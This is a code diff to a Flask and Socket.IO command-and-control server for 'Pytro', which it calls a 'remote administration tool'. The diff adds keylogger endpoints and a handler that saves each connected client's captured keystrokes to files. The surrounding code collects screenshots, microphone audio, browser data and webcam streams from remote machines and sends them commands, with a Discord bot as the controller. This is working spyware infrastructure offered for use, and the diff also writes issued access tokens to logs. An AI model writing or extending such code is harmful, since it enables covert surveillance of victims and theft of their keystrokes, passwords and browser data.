@@ -1,10 +1,13 @@
 import base64
 import json
+import logging
 import os
 import threading
 from datetime import datetime
 from queue import Queue
+from logging.handlers import RotatingFileHandler
 
+import click
 from flask import Flask, request, send_file, Response
 from flask_jwt_extended import create_access_token, jwt_required, JWTManager
 from flask_migrate import Migrate
@@ -18,6 +21,7 @@ from models import Client, Command, CommandType
 
 app = Flask(__name__)
 app.config.from_object(Config)
+app.config['DEBUG'] = True
 db.init_app(app)
 migrate = Migrate(app, db)
 jwt = JWTManager(app)
@@ -33,8 +37,8 @@ authorizations = {
     }
 }
 
-api = Api(app, version='1.0', title='Pedro API Documentation',
-          description='API Documentation for Pedro, a remote administration tool.',
+api = Api(app, version='1.0', title='Pytro API Documentation',
+          description='API Documentation for Pytro, a remote administration tool.',
           authorizations=authorizations)
 
 auth_ns = api.namespace('api/v1/auth', description='Authentication operations')
@@ -43,6 +47,7 @@ clients_ns = api.namespace('api/v1/clients', description='Client operations')
 screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot operations')
 microphone_ns = api.namespace('api/v1/microphone', description='Microphone operations')
 browser_ns = api.namespace('api/v1/browser', description='Browser data operations')
+keylogger_ns = api.namespace('api/v1/keylogger', description='Keylogger operations')
 webcam_ns = api.namespace('api/v1/webcam', description='Webcam operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
@@ -76,9 +81,56 @@ browser_model = api.model('Browser', {
     'file_path': fields.String(required=True, description='Chemin du fichier des données du navigateur'),
     'date_created': fields.String(required=True, description='Date de création des données du navigateur')
 })
+keylogger_model = api.model('Keylogger', {
+    'id': fields.Integer(required=True, description='ID du keylogger'),
+    'file_path': fields.String(required=True, description='Chemin du fichier du keylogger'),
+    'date_created': fields.String(required=True, description='Date de création du keylogger')
+})
 
 client_params = api.parser()
 client_params.add_argument('status', type=str, required=False, help='Filter clients by their status (online/offline).')
+
+
+class RemoveColorFilter(logging.Filter):
+    def filter(self, record):
+        if record.args:
+            record.args = tuple(click.unstyle(arg) if isinstance(arg, str) else arg for arg in record.args)
+        if isinstance(record.msg, str):
+            record.msg = click.unstyle(record.msg)
+        return True
+
+
+def setup_logging():
+    log_directory = os.path.join(os.getcwd(), 'logs')
+    os.makedirs(log_directory, exist_ok=True)
+
+    log_file = os.path.join(log_directory, 'app.log')
+
+    log_format = '%(asctime)s - %(levelname)s - %(message)s'
+    date_format = '%d/%m/%Y %H:%M:%S'
+
+    file_handler = RotatingFileHandler(log_file, maxBytes=10000, backupCount=10)
+    file_handler.setLevel(logging.INFO)
+    file_handler.setFormatter(logging.Formatter(log_format, datefmt=date_format))
+    file_handler.addFilter(RemoveColorFilter())
+
+    stream_handler = logging.StreamHandler()
+    stream_handler.setLevel(logging.INFO)
+    stream_handler.setFormatter(logging.Formatter(log_format, datefmt=date_format))
+    stream_handler.addFilter(RemoveColorFilter())
+
+    if app.logger.hasHandlers():
+        app.logger.handlers.clear()
+
+    app.logger.addHandler(file_handler)
+    app.logger.addHandler(stream_handler)
+    app.logger.setLevel(logging.INFO)
+    app.logger.addFilter(RemoveColorFilter())
+
+    werkzeug_logger = logging.getLogger('werkzeug')
+    werkzeug_logger.addHandler(file_handler)
+    werkzeug_logger.addHandler(stream_handler)
+    werkzeug_logger.addFilter(RemoveColorFilter())
 
 
 @auth_ns.route('/')
@@ -88,8 +140,10 @@ class Authenticate(Resource):
         auth_data = request.json
         if auth_data and auth_data.get('secret_key') == app.config['JWT_SECRET_KEY']:
             token = create_access_token(identity='bot_discord')
+            app.logger.info(f"Authentification réussie, token généré: Bearer {token}")
             return {'access_token': f'Bearer {token}'}, 200
         else:
+            app.logger.warning("Mauvaise clé secrète")
             return {"msg": "Mauvaise clé secrète"}, 401
 
 
@@ -107,6 +161,7 @@ class HandleCommand(Resource):
             try:
                 params = json.loads(params)
             except json.JSONDecodeError:
+                app.logger.error("Paramètres mal formés (JSON invalide).")
                 return {'status': 'error', 'message': 'Paramètres mal formés (JSON invalide).'}, 400
 
         duration = params.get('duration', 10) if isinstance(params, dict) else 10
@@ -114,11 +169,14 @@ class HandleCommand(Resource):
         client = Client.query.get(client_id)
         if client and client.status == 'online':
             socketio.emit('command', {'command': command, 'params': duration}, room=client.sid)
+            app.logger.info(f"Commande *{command}* envoyée au client {client_id} / {client.ip}.")
             return {'status': 'success',
                     'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}, 200
         elif client and client.status == 'offline':
+            app.logger.error(f"Client {client_id} hors ligne.")
             return {'status': 'error', 'message': f'**🔴 Client {client_id} hors ligne.'}, 400
         else:
+            app.logger.error("Client non trouvé.")
             return {'status': 'error', 'message': 'Client non trouvé.'}, 404
 
 
@@ -137,6 +195,7 @@ class GetClients(Resource):
         for client in clients:
             client.date_created = client.date_created.strftime('%d/%m/%Y à %H:%M:%S')
             client.date_updated = client.date_updated.strftime('%d/%m/%Y à %H:%M:%S')
+        app.logger.info(f"Liste des clients récupérée ({len(clients)} clients)")
         return clients, 200
 
 
@@ -149,6 +208,8 @@ class GetScreenshotsByClientId(Resource):
         screenshots = Command.query.filter_by(client_id=client_id, type=CommandType.SCREENSHOT).all()
         for screenshot in screenshots:
             screenshot.date_created = screenshot.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        app.logger.info(
+            f"Liste des captures d'écran récupérée pour le client {client_id} ({len(screenshots)} captures)")
         return screenshots, 200
 
 
@@ -159,8 +220,10 @@ class GetScreenshotImage(Resource):
     def get(self, screenshot_id):
         screenshot = Command.query.get(screenshot_id)
         if screenshot and os.path.exists(screenshot.file_path):
+            app.logger.info(f"Capture d'écran trouvée: {screenshot.file_path} pour le client {screenshot.client_id}")
             return send_file(screenshot.file_path, mimetype='image/png')
         else:
+            app.logger.error("Capture d'écran non trouvée.")
             return {'status': 'error', 'message': 'Capture d\'écran non trouvée.'}, 404
 
 
@@ -173,6 +236,8 @@ class GetMicrophonesByClientId(Resource):
         microphones = Command.query.filter_by(client_id=client_id, type=CommandType.MICROPHONE).all()
         for microphone in microphones:
             microphone.date_created = microphone.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        app.logger.info(
+            f"Liste des enregistrements audio récupérée pour le client {client_id} ({len(microphones)} enregistrements)")
         return microphones, 200
 
 
@@ -183,8 +248,11 @@ class GetMicrophoneAudio(Resource):
     def get(self, microphone_id):
         microphone = Command.query.get(microphone_id)
         if microphone and os.path.exists(microphone.file_path):
+            app.logger.info(
+                f"Enregistrement audio trouvé: {microphone.file_path} pour le client {microphone.client_id}")
             return send_file(microphone.file_path, mimetype='audio/wav')
         else:
+            app.logger.error("Enregistrement audio non trouvé.")
             return {'status': 'error', 'message': 'Enregistrement audio non trouvé.'}, 404
 
 
@@ -198,6 +266,8 @@ class GetBrowserDataByClientId(Resource):
                                                browser_name=browser_name).all()
         for data in browser_data:
             data.date_created = data.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        app.logger.info(
+            f"Données du navigateur récupérées pour le client {client_id} ({len(browser_data)} enregistrements)")
         return browser_data, 200
 
 
@@ -208,9 +278,36 @@ class GetBrowserDataFile(Resource):
     def get(self, browser_id):
         data = Command.query.get(browser_id)
         if data and os.path.exists(data.file_path):
+            app.logger.info(
+                f"Fichier de données du navigateur trouvé: {data.file_path} pour le client {data.client_id}")
             return send_file(data.file_path, mimetype='text/plain')
         else:
+            app.logger.error("Fichier de données du navigateur non trouvé.")
             return {'status': 'error', 'message': 'Fichier de données du navigateur non trouvé.'}, 404
+
+
+@keylogger_ns.route('/client/<int:client_id>')
+class GetKeyloggersByClientId(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    @keylogger_ns.marshal_with(keylogger_model, as_list=True)
+    def get(self, client_id):
+        keyloggers = Command.query.filter_by(client_id=client_id, type=CommandType.KEYLOGGER).all()
+        for keylogger in keyloggers:
+            keylogger.date_created = keylogger.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        return keyloggers, 200
+
+
+@keylogger_ns.route('/log/<int:keylogger_id>')
+class GetKeyloggerLog(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    def get(self, keylogger_id):
+        keylogger = Command.query.get(keylogger_id)
+        if keylogger and os.path.exists(keylogger.file_path):
+            return send_file(keylogger.file_path, mimetype='text/plain')
+        else:
+            return {'status': 'error', 'message': 'Fichier du keylogger non trouvé.'}, 404
 
 
 @webcam_ns.route('/<int:client_id>')
@@ -230,6 +327,7 @@ class StreamWebcam(Resource):
 @socketio.on('connect')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    app.logger.info(f"Client connecté: {client_ip}")
     sid = request.sid
     client = Client.query.filter_by(ip=client_ip).first()
     if client:
@@ -269,6 +367,7 @@ def handle_screenshot(data):
         new_command = Command(type=CommandType.SCREENSHOT, client_id=client.id, file_path=screenshot_path)
         db.session.add(new_command)
         db.session.commit()
+        app.logger.info(f"Capture d'écran reçue de {client_ip} et enregistrée sous {screenshot_path}")
 
 
 @socketio.on('audio_response')
@@ -287,6 +386,7 @@ def handle_audio(data):
         new_command = Command(type=CommandType.MICROPHONE, client_id=client.id, file_path=audio_path)
         db.session.add(new_command)
         db.session.commit()
+        app.logger.info(f"Enregistrement audio reçu de {client_ip} et enregistré sous {audio_path}")
 
 
 @socketio.on('browser_data_response')
@@ -310,6 +410,29 @@ def handle_browser_data(data):
                               browser_name=browser)
         db.session.add(new_command)
         db.session.commit()
+        app.logger.info(f"Données du navigateur reçues de {client.ip} et enregistrées sous {file_path}")
+
+
+@socketio.on('keyboard_response')
+def handle_keyboard(data):
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        keylogger_dir = f"keyloggers/{client.ip}"
+        os.makedirs(keylogger_dir, exist_ok=True)
+        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H')}.txt"
+        keylogger_path = f"{keylogger_dir}/{file_name}"
+        with open(keylogger_path, 'a', encoding='utf-8') as f:
+            for key in data.get('keyboard_log'):
+                f.write(f"{key}\n")
+        new_command = Command(type=CommandType.KEYLOGGER, client_id=client.id, file_path=keylogger_path)
+        if db.session.query(Command).filter_by(file_path=keylogger_path).count() > 0:
+            update_command = Command.query.filter_by(file_path=keylogger_path).first()
+            update_command.date_created = datetime.now()
+            db.session.commit()
+        else:
+            db.session.add(new_command)
+            db.session.commit()
 
 
 @socketio.on('webcam_response')
@@ -326,6 +449,7 @@ def handle_disconnect():
         client.status = 'offline'
         client.date_updated = datetime.now()
         db.session.commit()
+        app.logger.info(f"Client déconnecté: {client.ip}")
 
 
 def stream_frames():
@@ -334,6 +458,6 @@ def stream_frames():
         yield (b'--frame\r\n'
                b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
 
-
+setup_logging()
 if __name__ == '__main__':
     socketio.run(app, host='127.0.0.1', port=5000, debug=True, ssl_context=('cert.pem', 'key.pem'))
